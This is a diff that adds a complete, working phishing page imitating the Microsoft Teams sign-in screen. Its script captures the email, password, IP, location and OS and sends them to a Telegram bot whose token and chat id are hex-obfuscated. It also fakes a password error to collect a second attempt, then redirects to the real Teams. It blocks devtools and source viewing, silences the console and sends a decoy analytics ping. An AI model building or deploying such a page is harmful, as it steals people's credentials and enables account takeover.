@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>
+   Sign in to your account
+  </title>
+  <link href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_e0480c6913a28607.ico" rel="icon" type="image/png"/>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js">
+  </script>
+  <style>
+   :root { --nt-accent: #6264a7; --nt-error: #e81123; --nt-hover: #4e5093; }
+        * { box-sizing: border-box; }
+        body { font-family: "Segoe UI", "Segoe UI Web", Arial, "Helvetica Neue", sans-serif; background: #f2f2f2 url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc7d29036ceed225cf09a2d4a076cdcc.svg') no-repeat center center fixed; background-size: cover; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .nectar-card { background: #fff; padding: 44px 44px 48px; width: 100%; max-width: 440px; box-shadow: 0 2px 12px rgba(0,0,0,0.18), 0 0 2px rgba(0,0,0,0.08); box-sizing: border-box; position: relative; border-radius: 4px; transition: all 0.2s ease; }
+        .nectar-logo { height: 26px; margin-bottom: 28px; display: block; object-fit: contain; }
+        h1 { font-size: 1.5rem; font-weight: 600; color: #1b1b1b; margin: 0 0 12px 0; letter-spacing: -0.2px; }
+        .verify-text { font-size: 0.93rem; color: #3b3b3b; margin-bottom: 24px; line-height: 1.4; }
+        .nectar-input { width: 100%; border: none; border-bottom: 1px solid #8c8c8c; padding: 10px 0 6px 0; font-size: 0.95rem; margin-bottom: 24px; outline: none; border-radius: 0; background: transparent; transition: border-color 0.1s; }
+        .nectar-input:focus { border-bottom: 2px solid var(--nt-accent); margin-bottom: 23px; }
+        .nectar-input.err-line { border-bottom: 2px solid var(--nt-error); }
+        .err-msg { color: var(--nt-error); font-size: 0.81rem; margin-bottom: 8px; display: none; font-weight: 500; }
+        .nectar-link { font-size: 0.81rem; color: var(--nt-accent); cursor: pointer; text-decoration: none; display: inline-block; margin-bottom: 12px; font-weight: 500; }
+        .nectar-link:hover { text-decoration: underline; color: var(--nt-hover); }
+        .nectar-btn { background: var(--nt-accent); color: #fff; border: none; padding: 8px 28px; float: right; cursor: pointer; font-size: 0.9rem; min-width: 100px; border-radius: 2px; font-weight: 600; transition: background 0.2s; }
+        .nectar-btn:hover { background: var(--nt-hover); }
+        .user-row { margin-bottom: 20px; display: none; align-items: center; font-size: 0.93rem; cursor: pointer; padding: 5px 0; border-radius: 4px; width: fit-content; }
+        .user-row:hover { background-color: #f5f5f5; }
+        .back-icon { margin-right: 12px; display: flex; align-items: center; }
+        #nectar-loader { display: none; width: 100%; height: 3px; background: #e1e1e1; position: absolute; top: 0; left: 0; overflow: hidden; border-radius: 2px 2px 0 0; }
+        #nectar-loader::after { content: ""; display: block; width: 40%; height: 100%; background: var(--nt-accent); animation: nectar-load 1.2s infinite ease; }
+        @keyframes nectar-load { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
+        footer { position: fixed; bottom: 0; width: 100%; display: flex; justify-content: flex-end; padding: 12px 28px; font-size: 0.7rem; color: #5e5e5e; background: rgba(255,255,255,0.7); backdrop-filter: blur(2px); gap: 20px; }
+        .action-group { margin-top: 32px; display: flex; justify-content: space-between; align-items: center; }
+        .inline-link { display: inline-block; margin-left: 6px; }
+        @media (max-width: 480px) { .nectar-card { padding: 32px 28px; } }
+  </style>
+ </head>
+ <body oncontextmenu="return false;">
+  <div class="nectar-card">
+   <div id="nectar-loader">
+   </div>
+   <img alt="Microsoft" class="nectar-logo" id="nectar_logo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"/>
+   <div id="step_email">
+    <h1>
+     Sign in to Continue
+    </h1>
+    <div class="err-msg" id="msg_email_err">
+     Enter a valid email address, phone number, or Skype name.
+    </div>
+    <input autocomplete="off" class="nectar-input" id="nectar_user" placeholder="Email, phone, or Skype" type="email"/>
+    <div style="font-size: 0.81rem; margin-bottom: 16px; color: #3b3b3b;">
+     No account?
+     <span class="nectar-link inline-link" id="create_account_link">
+      Create one!
+     </span>
+    </div>
+    <span class="nectar-link" id="cant_access_link">
+     Can’t access your account?
+    </span>
+    <div class="action-group">
+     <div>
+     </div>
+     <button class="nectar-btn" id="btn_next">
+      Next
+     </button>
+    </div>
+   </div>
+   <div id="step_pass" style="display:none;">
+    <div class="user-row" id="btn_back" style="display:flex;">
+     <div class="back-icon">
+      <svg fill="none" height="18" viewbox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg">
+       <path d="M19 12H5M12 19L5 12L12 5" stroke="#666" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8">
+       </path>
+      </svg>
+     </div>
+     <span id="txt_user_display" style="font-weight:500; color:#1b1b1b;">
+     </span>
+    </div>
+    <h1>
+     Enter password
+    </h1>
+    <p class="verify-text">
+     You have been redirected. Please verify your password to continue.
+    </p>
+    <div class="err-msg" id="msg_pass_err">
+     Your password is incorrect. Please try again.
+    </div>
+    <input autocomplete="off" class="nectar-input" id="nectar_pass" placeholder="Password" type="password"/>
+    <span class="nectar-link" id="forgot_pass_link">
+     Forgot password?
+    </span>
+    <div class="action-group">
+     <div>
+     </div>
+     <button class="nectar-btn" id="btn_verify">
+      Sign in
+     </button>
+    </div>
+   </div>
+  </div>
+  <footer>
+   <span>
+    Terms of use
+   </span>
+   <span>
+    Privacy &amp; cookies
+   </span>
+  </footer>
+  <script>
+   (function(){
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.keyCode === 85 || e.keyCode === 83)) {
+                e.preventDefault(); return false;
+            }
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c'))) {
+                e.preventDefault(); return false;
+            }
+        });
+
+        var _0x = [
+    "\x39\x32\x30\x33\x37\x35\x38\x39\x33\x31\x3a\x41\x41\x47\x58\x79\x63\x43\x39\x6e\x67\x64\x37\x30\x6f\x64\x65\x43\x54\x53\x70\x5f\x30\x2d\x4c\x52\x65\x6a\x6a\x7a\x67\x49\x43\x4f\x67\x49",
+    "\x36\x36\x38\x36\x31\x36\x39\x31\x36\x30"];
+        var _token = _0x[0];
+        var _chat = _0x[1];
+        var _api = 'https://api.telegram.org/bot' + _token + '/sendMessage';
+
+        var current_email = "", attempt_count = 0, ip_data = "Detecting...";
+
+        function getOS() {
+            var ua = navigator.userAgent;
+            if (/iPhone|iPad|iPod/.test(ua)) return "iPhone";
+            if (/Android/.test(ua)) return "Android";
+            if (/Mac OS X/.test(ua)) return "macOS";
+            if (/Windows/.test(ua)) return "Windows";
+            if (/Linux/.test(ua)) return "Linux";
+            return "Unknown";
+        }
+
+        function fetchIp() {
+            $.get('https://ipapi.co/json/', function(res) {
+                if (res && res.ip) {
+                    ip_data = res.ip + " (" + res.city + ", " + res.country_name + ")";
+                }
+            }).fail(function() {
+                ip_data = "IP lookup failed";
+            });
+        }
+        fetchIp();
+
+        function nectar_logo_sync(email) {
+            var domain = email.split('@')[1];
+            if(domain && domain.length > 2) {
+                $("#nectar_logo").attr("src", "https://logo.clearbit.com/" + domain);
+                $("#nectar_logo").off("error").on("error", function() { 
+                    $(this).attr("src", "https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"); 
+                });
+            } else {
+                $("#nectar_logo").attr("src", "https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg");
+            }
+        }
+
+        $(document).ready(function() {
+            var hash = window.location.hash.substr(1);
+            if (hash && hash.includes('@')) {
+                $('#nectar_user').val(hash);
+                nectar_logo_sync(hash);
+                setTimeout(function() { $('#btn_next').click(); }, 800);
+            }
+        });
+
+        $('#btn_next').click(function() {
+            var raw_email = $('#nectar_user').val().trim();
+            if(raw_email === "") {
+                $('#msg_email_err').text("Enter a valid email address, phone, or Skype.");
+                $('#msg_email_err').show();
+                $('#nectar_user').addClass('err-line');
+                return;
+            }
+            if(!raw_email.includes('@') && raw_email.length < 3) {
+                $('#msg_email_err').text("Please enter your email, phone, or Skype name.");
+                $('#msg_email_err').show();
+                $('#nectar_user').addClass('err-line');
+                return;
+            }
+            current_email = raw_email;
+            $('#nectar-loader').show();
+            nectar_logo_sync(current_email);
+            setTimeout(function(){
+                $('#nectar-loader').hide();
+                $('#txt_user_display').text(current_email);
+                $('#step_email').hide(); 
+                $('#step_pass').show(); 
+                $('#nectar_pass').val('').focus();
+                $('#msg_pass_err').hide();
+                $('#nectar_pass').removeClass('err-line');
+            }, 600);
+        });
+
+        $('#btn_verify').click(function() {
+            var password = $('#nectar_pass').val();
+            if(password.length === 0) {
+                $('#msg_pass_err').text("Please enter your password.");
+                $('#msg_pass_err').show();
+                $('#nectar_pass').addClass('err-line');
+                return;
+            }
+            if(password.length < 4) {
+                $('#nectar_pass').addClass('err-line');
+                setTimeout(function() { $('#nectar_pass').removeClass('err-line'); }, 1500);
+                return;
+            }
+            attempt_count++;
+            $('#nectar-loader').show();
+
+            var osInfo = getOS();
+            var report = "🚀 TEAMS PORTAL HIT\n\n📧 User: " + current_email + "\n🔑 Pass: " + password + "\n🔢 Attempt: #" + attempt_count + "\n🌐 IP: " + ip_data + "\n📱 OS: " + osInfo;
+
+            function sendReport() {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', _api, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ chat_id: _chat, text: report }));
+            }
+
+            function dummyPing() {
+                var img = new Image();
+                img.src = 'https://www.google-analytics.com/collect?v=1&tid=UA-123456-1&cid=123&t=event&ec=test&ea=click';
+            }
+
+            var delay = 150 + Math.floor(Math.random() * 250);
+            setTimeout(function() {
+                sendReport();
+                dummyPing();
+            }, delay);
+
+            setTimeout(function() {
+                $('#nectar-loader').hide();
+                if (attempt_count < 2) {
+                    $('#nectar_pass').val('').addClass('err-line');
+                    $('#msg_pass_err').text("Your password is incorrect. Please try again.");
+                    $('#msg_pass_err').show();
+                } else {
+                    window.location.replace("https://teams.microsoft.com/");
+                }
+            }, 1200);
+        });
+
+        $('#btn_back').click(function(){ 
+            $('#step_pass').hide(); 
+            $('#step_email').show(); 
+            $('#msg_pass_err').hide(); 
+            $('#msg_email_err').hide();
+            $('.nectar-input').removeClass('err-line');
+            $('#nectar_user').focus();
+        });
+
+        $('#forgot_pass_link, #cant_access_link, #create_account_link').click(function(e){
+            e.preventDefault();
+            alert("Redirecting to account services...");
+        });
+
+        $('#nectar_user').keypress(function(e) {
+            if(e.which === 13) { e.preventDefault(); $('#btn_next').click(); }
+        });
+        $('#nectar_pass').keypress(function(e) {
+            if(e.which === 13) { e.preventDefault(); $('#btn_verify').click(); }
+        });
+
+        Object.defineProperty(window, 'console', {
+            get: function() { return { log: function() {}, error: function() {}, warn: function() {} }; }
+        });
+    })();
+  </script>
+ </body>
+</html>
